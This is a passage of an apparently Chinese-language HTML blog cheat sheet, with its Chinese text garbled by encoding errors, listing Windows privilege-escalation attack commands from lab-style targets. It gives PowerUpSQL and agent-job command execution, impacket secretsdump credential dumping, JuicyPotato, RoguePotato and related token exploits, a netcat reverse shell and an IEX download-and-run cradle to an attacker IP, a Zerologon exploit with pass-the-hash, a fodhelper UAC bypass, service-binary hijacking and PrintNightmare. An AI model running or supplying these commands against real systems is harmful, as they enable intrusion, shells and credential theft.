class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Invoke-SQLEscalatePriv</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSCLR</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;Whoami&quot;</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSPython</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;Whoami&quot;</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSCmdAgentJob</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-SubSystem</span> CmdExec <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;echo hello &gt; c:\windows\temp\test1.txt&quot;</span><br><span class="hljs-variable">$Targets</span> | <span class="hljs-built_in">Invoke-SQLOSCmdAgentJob</span> <span class="hljs-literal">-Verbose</span> <span class="hljs-literal">-SubSystem</span> PowerShell <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;write-output &quot;hello world&quot; | out-file c:\windows\temp\test2.txt&#x27;</span> <span class="hljs-literal">-Sleep</span> <span class="hljs-number">20</span>     <br></code></pre></td></tr></table></figure>

<h3 id="02-3-Seatbelt-exe"><a href="#02-3-Seatbelt-exe" class="headerlink" title="02.3 Seatbelt.exe"></a>02.3 Seatbelt.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># è¿è¡Œæ‰€æœ‰æšä¸¾æ£€æŸ¥</span><br>Seatbelt.exe <span class="hljs-literal">-group</span>=all<br></code></pre></td></tr></table></figure>

<h3 id="02-4-ç§˜å¯†è½¬å‚¨"><a href="#02-4-ç§˜å¯†è½¬å‚¨" class="headerlink" title="02.4 ç§˜å¯†è½¬å‚¨"></a>02.4 <strong>ç§˜å¯†è½¬å‚¨</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| å¦‚æœæ‰‹å¤´æœ‰SAMå’ŒSYSTEMæ–‡ä»¶</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-sam</span> SAM <span class="hljs-literal">-system</span> SYSTEM local<br><br><span class="hljs-comment">## ------------------| Remote</span><br>impacket<span class="hljs-literal">-secretsdump</span> htb.local/h4rithd:<span class="hljs-string">&#x27;Passw0rD$&#x27;</span>@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br><br><span class="hljs-comment"># 31d6cfe0d16ae931b73c59d7e0c089c0 &lt;-- blank</span><br><span class="hljs-comment"># aad3b435b51404eeaad3b435b51404ee &lt;-- blank [LM]</span><br><br><span class="hljs-comment">## ------------------| Remote NTDS</span><br><span class="hljs-comment">## Copy ntds file</span><br>robocopy /B C:\Windows\ntds .\ntds ntds.dit<br><span class="hljs-comment">## Copy sam and system file then run</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-sam</span> SAMFILE <span class="hljs-literal">-system</span> SYSTEMFILE <span class="hljs-literal">-ntds</span> NTDS.DIT local<br><br><span class="hljs-comment">## ------------------| Local NTDS</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-system</span> ntds.bin <span class="hljs-literal">-ntds</span> ntds.dit local<br><span class="hljs-comment">## ntds.bin: MS Windowsæ³¨å†Œè¡¨æ–‡ä»¶ï¼ŒNT/2000æˆ–æ›´é«˜ç‰ˆæœ¬</span><br><span class="hljs-comment">## ntds.dit: å¯æ‰©å±•å­˜å‚¨å¼•æ“æ•°æ®åº“ï¼Œç‰ˆæœ¬0x620ï¼Œæ ¡éªŒå’Œ0x16d44752ï¼Œé¡µé¢å¤§å°8192ï¼ŒDirtyShutdownï¼ŒWindows 6.1ç‰ˆ</span><br></code></pre></td></tr></table></figure>

<h2 id="03-å¸¸è§æ¼æ´"><a href="#03-å¸¸è§æ¼æ´" class="headerlink" title="03.å¸¸è§æ¼æ´"></a>03.å¸¸è§æ¼æ´</h2><h3 id="03-0-GodPotatoï¼ˆæ–°ï¼‰"><a href="#03-0-GodPotatoï¼ˆæ–°ï¼‰" class="headerlink" title="03.0 GodPotatoï¼ˆæ–°ï¼‰"></a>03.0 <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">GodPotato</a>ï¼ˆæ–°ï¼‰</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download</span><br><span class="hljs-comment">#### .Net4</span><br><span class="hljs-built_in">wget</span> https://github.com/BeichenDream/GodPotato/releases/download/V1.<span class="hljs-number">20</span>/GodPotato<span class="hljs-literal">-NET4</span>.exe <span class="hljs-literal">-O</span> GodPotato.exe<br><span class="hljs-comment">#### .Net3.5</span><br><span class="hljs-built_in">wget</span> https://github.com/BeichenDream/GodPotato/releases/download/V1.<span class="hljs-number">20</span>/GodPotato<span class="hljs-literal">-NET35</span>.exe <span class="hljs-literal">-O</span> GodPotato.exe<br><span class="hljs-comment">#### .Net2</span><br><span class="hljs-built_in">wget</span> https://github.com/BeichenDream/GodPotato/releases/download/V1.<span class="hljs-number">20</span>/GodPotato<span class="hljs-literal">-NET2</span>.exe <span class="hljs-literal">-O</span> GodPotato.exe<br><br><span class="hljs-comment">## ------------------| Exploit</span><br>.\GodPotato.exe <span class="hljs-literal">-cmd</span> <span class="hljs-string">&quot;powershell -EncodedCommand SQBFAFgAKABOA.....ApAA==&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="03-0-JuicyPotatoNGï¼ˆæ–°ï¼‰"><a href="#03-0-JuicyPotatoNGï¼ˆæ–°ï¼‰" class="headerlink" title="03.0 JuicyPotatoNGï¼ˆæ–°ï¼‰"></a>03.0 <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a>ï¼ˆæ–°ï¼‰</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| éªŒè¯æ¼æ´</span><br>whoami /priv | findstr <span class="hljs-string">&quot;Enabled&quot;</span><br><span class="hljs-comment"># æ£€æŸ¥â€œSeImpersonatePrivilegeæˆ–SeAssignPrimaryTokenæ˜¯å¦å·²å¯ç”¨â€ï¼Œæˆ‘ä»¬å¾ˆå¥½ï¼ï¼ ğŸ‘ŒğŸ‘ŒğŸ‘Œ</span><br><br><span class="hljs-comment">## ------------------| Download to local machine</span><br><span class="hljs-built_in">wget</span> https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.<span class="hljs-number">1</span>/JuicyPotatoNG.zip                                                             <br>unzip JuicyPotatoNG.zip<br><br><span class="hljs-comment">## ------------------| ä¸Šä¼ åˆ°å—å®³è€…çš„æœºå™¨ä¸Šååˆ›å»ºbatæ–‡ä»¶</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;powershell -EncodedCommand SQBFAFgAKABOA.....ApAA==&quot;</span> &gt; shell.bat<br><span class="hljs-built_in">type</span> C:\programdata\shell.bat<br><br><span class="hljs-comment">## ------------------| Run</span><br>.\JuicyPotatoNG.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-p</span> &lt;fullPath&gt;\shell.bat<br></code></pre></td></tr></table></figure>

<h3 id="03-1-JuicyPotatoï¼ˆæ»¥ç”¨é»„é‡‘ç‰¹æƒï¼‰"><a href="#03-1-JuicyPotatoï¼ˆæ»¥ç”¨é»„é‡‘ç‰¹æƒï¼‰" class="headerlink" title="03.1 JuicyPotatoï¼ˆæ»¥ç”¨é»„é‡‘ç‰¹æƒï¼‰"></a>03.1 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>ï¼ˆæ»¥ç”¨é»„é‡‘ç‰¹æƒï¼‰</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| éªŒè¯æ¼æ´</span><br>whoami /priv | findstr <span class="hljs-string">&quot;Enabled&quot;</span><br><span class="hljs-comment"># æ£€æŸ¥â€œSeImpersonatePrivilegeæˆ–SeAssignPrimaryTokenæ˜¯å¦å·²å¯ç”¨â€ï¼Œæˆ‘ä»¬å¾ˆå¥½ï¼ï¼ğŸ‘ŒğŸ‘ŒğŸ‘Œ</span><br><br><span class="hljs-comment">## ------------------| Create .bat script</span><br><span class="hljs-comment">## Shell é€šè¿‡ Netcat </span><br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">START</span> C:\&lt;path&gt;\nc.exe <span class="hljs-literal">-e</span> powershell.exe YourIP YourPort &gt; sh3ll.bat<br><span class="hljs-comment">## Shell é€šè¿‡ Powershell </span><br>cmd.exe /c powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.26/rev.ps1&#x27;</span>)   <br><br><span class="hljs-comment">## ------------------| List CLSID&#x27;s</span><br>.\JuicyPotato.exe <span class="hljs-literal">-z</span> <span class="hljs-literal">-l</span> <span class="hljs-number">100</span><br><br><span class="hljs-comment">## ------------------| Execute </span><br>.\JuicyPotato.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span> <span class="hljs-literal">-p</span> C:\Users\Public\shell.bat <span class="hljs-literal">-l</span> <span class="hljs-number">1337</span>  <br>.\JuicyPotato.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span> <span class="hljs-literal">-p</span> C:\Users\Public\shell.exe <span class="hljs-literal">-l</span> <span class="hljs-number">1337</span>  <br><br><span class="hljs-comment">## ------------------| å¸¸è§„é€‰é¡¹</span><br><span class="hljs-comment"># Mandatory args:</span><br><span class="hljs-literal">-t</span> åˆ›å»ºè¿›ç¨‹ call: &lt;t&gt; ä½¿ç”¨ä»¤ç‰ŒWåˆ›å»ºè¿›ç¨‹, &lt;u&gt; åˆ›å»ºè¿›ç¨‹ä¸ºç”¨æˆ·, &lt;*&gt; ä¸¤è€…éƒ½è¯•è¯•  <br><span class="hljs-literal">-p</span> &lt;program&gt;: è¦å¯åŠ¨çš„ç¨‹åº<br><span class="hljs-literal">-l</span> &lt;port&gt;: COM server listen port<br><br><span class="hljs-comment"># Optional args:</span><br><span class="hljs-literal">-m</span> &lt;ip&gt;: COM server listen address (default <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)<br><span class="hljs-literal">-a</span> &lt;argument&gt;: è¦ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•° (default NULL)<br><span class="hljs-literal">-k</span> &lt;ip&gt;: RPC server ip address (default <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)<br><span class="hljs-literal">-n</span> &lt;port&gt;: RPC server listen port (default <span class="hljs-number">135</span>)<br><span class="hljs-literal">-c</span> &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;<span class="hljs-number">4991</span>d34b<span class="hljs-literal">-80a1-4291-83b6-3328366b9097</span>&#125;)<br><span class="hljs-literal">-z</span> ä»…æµ‹è¯•CLSIDå¹¶æ‰“å°ä»¤ç‰Œçš„ç”¨æˆ·<br></code></pre></td></tr></table></figure>

<ul>
<li>å•å‡»<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">æ­¤å¤„</a>æŸ¥çœ‹ CLSID</li>
</ul>
<h3 id="03-2-RoguePotatoï¼ˆä¸å†æœ‰JuicyPotatoï¼Ÿè€æ•…äº‹ï¼Œæ¬¢è¿RoguePotatoï¼ï¼‰"><a href="#03-2-RoguePotatoï¼ˆä¸å†æœ‰JuicyPotatoï¼Ÿè€æ•…äº‹ï¼Œæ¬¢è¿RoguePotatoï¼ï¼‰" class="headerlink" title="03.2 RoguePotatoï¼ˆä¸å†æœ‰JuicyPotatoï¼Ÿè€æ•…äº‹ï¼Œæ¬¢è¿RoguePotatoï¼ï¼‰"></a>03.2 <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a>ï¼ˆ<a target="_blank" rel="noopener" href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">ä¸å†æœ‰JuicyPotatoï¼Ÿè€æ•…äº‹ï¼Œæ¬¢è¿RoguePotatoï¼</a>ï¼‰</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| è¿è¡ŒChiselç»‘å®š9999ç«¯å£</span><br>chisel server <span class="hljs-literal">--reverse</span> <span class="hljs-literal">--port</span> <span class="hljs-number">1337</span> <span class="hljs-comment">## ä»æˆ‘ä»¬è¿™è¾¹æœºå™¨å¯åŠ¨</span><br>.\chisel64.exe client &lt;MyIP&gt;:<span class="hljs-number">1337</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">9999</span>:localhost:<span class="hljs-number">9999</span> <span class="hljs-comment">## åœ¨é¶æœºä¸Šé¢å¯åŠ¨</span><br><br><span class="hljs-comment">## ------------------| è¿è¡Œ socat æ¥è¿æ¥ 135 ç«¯å£å’Œ 9999 ç«¯å£ </span><br>sudo socat tcp<span class="hljs-literal">-listen</span>:<span class="hljs-number">135</span>,reuseaddr,fork tcp:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span> <span class="hljs-comment">## ä»æˆ‘ä»¬è¿™è¾¹æœºå™¨å¯åŠ¨</span><br><br><span class="hljs-comment">## ------------------| æ‰§è¡Œæµæ°“åœŸè±†</span><br>.\RoguePotato.exe <span class="hljs-literal">-r</span> &lt;MyIP&gt; <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;powershell C:\Windows\Temp\rev.ps1&quot;</span> <span class="hljs-literal">-l</span> <span class="hljs-number">9999</span><br><span class="hljs-comment"># or </span><br>.\RoguePotato.exe <span class="hljs-literal">-r</span> &lt;MyIP&gt; <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;c:\windows\temp\h4rithd.exe&quot;</span> <span class="hljs-literal">-l</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>

<h3 id="03-3-MultiPotato"><a href="#03-3-MultiPotato" class="headerlink" title="03.3 MultiPotato"></a>03.3 <a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/MultiPotato">MultiPotato</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download</span><br><span class="hljs-comment">### Bit 64</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/raw/main/MultiPotato/Multipotatox64.exe <span class="hljs-literal">-O</span> Multipotato.exe <br><span class="hljs-comment">### Bit 32</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/blob/main/MultiPotato/Multipotatox86.exe <span class="hljs-literal">-O</span> Multipotato.exe     <br><br><span class="hljs-comment">## ------------------| å¸¦SpoolSampleç®¡é“åç§°çš„BindShell</span><br>.\MultiPotato.exe <span class="hljs-literal">-t</span> BindShell <span class="hljs-literal">-p</span> <span class="hljs-string">&quot;pwned\pipe\spoolss&quot;</span><br><br><span class="hljs-comment">## ------------------| CreateUserä¸ä¿®æ”¹çš„PetitPotamè§¦å‘å™¨</span><br>.\Multipotato.exe <span class="hljs-literal">-t</span> CreateUser<br><br><span class="hljs-comment">## ------------------| ä½¿ç”¨SpoolSampleè§¦å‘å™¨åˆ›å»ºProcessAsUserW</span><br>.\Multipotato.exe <span class="hljs-literal">-t</span> CreateProcessAsUserW <span class="hljs-literal">-p</span> <span class="hljs-string">&quot;pwned\pipe\spoolss&quot;</span> <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;C:\temp\stage2.exe&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="03-4-PrintSpoofer-ï¼ˆæ‰“å°æ¬ºéª—ï¼‰"><a href="#03-4-PrintSpoofer-ï¼ˆæ‰“å°æ¬ºéª—ï¼‰" class="headerlink" title="03.4 PrintSpoofer ï¼ˆæ‰“å°æ¬ºéª—ï¼‰"></a>03.4 PrintSpoofer ï¼ˆæ‰“å°æ¬ºéª—ï¼‰</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># !!! å¿…é¡»å®‰è£…Microsoft Visual C++Redistributable</span><br><br>.\PrintSpoofer.exe <span class="hljs-literal">-i</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\\&lt;PATH&gt;\shell.exe&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="03-5-Netlogon-CVE-2020-1472"><a href="#03-5-Netlogon-CVE-2020-1472" class="headerlink" title="03.5 Netlogon | CVE 2020-1472"></a>03.5 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">Netlogon | CVE 2020-1472</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">git clone https://github.com/dirkjanm/CVE<span class="hljs-literal">-2020-1472</span>.git<br><span class="hljs-built_in">cd</span> CVE<span class="hljs-literal">-2020-1472</span><br>python3 cve<span class="hljs-literal">-2020-1472-exploit</span>.py MULTIMASTER <span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span><br><br><span class="hljs-comment"># å¦‚æœåˆ©ç”¨å®Œæˆï¼Œ</span><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-just-dc</span> <span class="hljs-literal">-no-pass</span> MULTIMASTER\<span class="hljs-variable">$</span>@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span><br><br><span class="hljs-comment"># ç°åœ¨æ‚¨å¯ä»¥ä½¿ç”¨æ­¤ç™»å½•</span><br><span class="hljs-comment"># &#x27;$&#x27; ç”¨äºè®¡ç®—æœºå¸æˆ·</span><br>impacket<span class="hljs-literal">-psexec</span> Administrator@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.179</span> <span class="hljs-literal">-hashes</span> <span class="hljs-number">69</span>cbf4a9b7415c9e1caf93d51d971be0:<span class="hljs-number">69</span>cbf4a9b7415c9e1caf93d51d971be0  <br></code></pre></td></tr></table></figure>

<h3 id="03-6-Fodhelper-exe-UACç»•è¿‡"><a href="#03-6-Fodhelper-exe-UACç»•è¿‡" class="headerlink" title="03.6 Fodhelper.exe - UACç»•è¿‡"></a>03.6 <a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">Fodhelper.exe - UACç»•è¿‡</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| CMD</span><br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\shell\open\command<br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\shell\open\command /v DelegateExecute /t REG_SZ         <br>REG ADD HKCU\Software\Classes\ms<span class="hljs-literal">-settings</span>\shell\open\command /d <span class="hljs-string">&quot;cmd.exe /c powershell -EncodedCommand SQBF..dgZFS==&quot;</span> /f                 <br>C:\Windows\System32\fodhelper.exe<br><br><span class="hljs-comment">## ------------------| Powershell</span><br><span class="hljs-variable">$program</span> = <span class="hljs-string">&quot;cmd.exe /c powershell -EncodedCommand SQBF..dgZFS==&quot;</span><br><span class="hljs-built_in">New-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DelegateExecute&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;(default)&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$program</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;C:\Windows\System32\fodhelper.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><br><br><span class="hljs-comment">## ------------------| Remove</span><br><span class="hljs-built_in">Remove-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\&quot;</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure>

<h3 id="03-7-æœåŠ¡ä¸å®‰å…¨æ–‡ä»¶æƒé™"><a href="#03-7-æœåŠ¡ä¸å®‰å…¨æ–‡ä»¶æƒé™" class="headerlink" title="03.7 æœåŠ¡ä¸å®‰å…¨æ–‡ä»¶æƒé™"></a>03.7 æœåŠ¡ä¸å®‰å…¨æ–‡ä»¶æƒé™</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| æšä¸¾</span><br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">Select-Object</span> Name, State, PathName | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.State <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;Running&#x27;</span>&#125; | findstr Serviio          <br>icacls <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span> <span class="hljs-comment"># Check if we have BUILTIN\Users:(I)(F)</span><br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">move</span> <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span> <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService_original.exe&quot;</span><br><span class="hljs-built_in">move</span> revshell.exe <span class="hljs-string">&quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br>net stop Serviio <br><span class="hljs-comment">## or </span><br>wmic service <span class="hljs-built_in">where</span> caption=<span class="hljs-string">&quot;Serviio&quot;</span> get name, caption, state,startmode<br>whoami /priv | findstr SeShutdownPrivilege <span class="hljs-comment">## ç¦ç”¨OK</span><br>shutdown /<span class="hljs-built_in">r</span> /t <span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>

<h3 id="03-8-Windows-Print-Spooler"><a href="#03-8-Windows-Print-Spooler" class="headerlink" title="03.8 Windows Print Spooler "></a>03.8 <a target="_blank" rel="noopener" href="https://github.com/calebstewart/CVE-2021-1675">Windows Print Spooler </a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| éªŒè¯æ¼æ´</span><br>impacket<span class="hljs-literal">-rpcdump</span> <span class="hljs-selector-tag">@</span>&lt;IP&gt; | grep <span class="hljs-literal">-A2</span> <span class="hljs-literal">-B2</span> MS<span class="hljs-literal">-RPRN</span> <br><br><span class="hljs-comment">## ------------------| Download and execute</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/calebstewart/CVE<span class="hljs-literal">-2021-1675</span>/main/CVE<span class="hljs-literal">-2021-1675</span>.ps1<br><span class="hljs-built_in">Import-Module</span> .\CVE<span class="hljs-literal">-2021-1675</span>.ps1<br><span class="hljs-built_in">Invoke-Nightmare</span> <br><span class="hljs-comment">## å¦‚æœæ‚¨é‡åˆ°ä»»ä½•ç±»å‹çš„é”™è¯¯ï¼Œå¦‚ExecutionPolicyï¼›ä¸evil-winrmä¸€èµ·å°è¯•</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> &lt;IP&gt; <span class="hljs-literal">-u</span> &lt;USERNAME&gt; <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;  <span class="hljs-literal">-s</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>)<br>CVE<span class="hljs-literal">-2021-1675</span>.ps1<br>menu<br><span class="hljs-built_in">Invoke-Nightmare</span><br><br><span class="hljs-comment">## ç„¶åä½¿ç”¨psexecä½¿ç”¨æ–°çš„credç™»å½•</span><br>impacket<span class="hljs-literal">-psexec</span> adm1n:<span class="hljs-string">&#x27;P@ssw0rd&#x27;</span><span class="hljs-selector-tag">@</span>&lt;IP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="03-9-æ°¸æ’ä¹‹è“-MS17-010"><a href="#03-9-æ°¸æ’ä¹‹è“-MS17-010" class="headerlink" title="03.9 æ°¸æ’ä¹‹è“ (MS17-010)"></a>03.9 æ°¸æ’ä¹‹è“ (MS17-010)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check</span><br>nmap <span class="hljs-literal">-sV</span> <span class="hljs-literal">-Pn</span> <span class="hljs-literal">-p</span> <span class="hljs-number">445</span> <span class="hljs-literal">--script</span> smb<span class="hljs-literal">-vuln-ms17-010</span> <span class="hljs-variable">$IP</span><br><br><span class="hljs-comment">## ------------------| Setup</span><br>git clone https://github.com/helviojunior/MS17<span class="hljs-literal">-010</span>.git &amp;&amp; <span 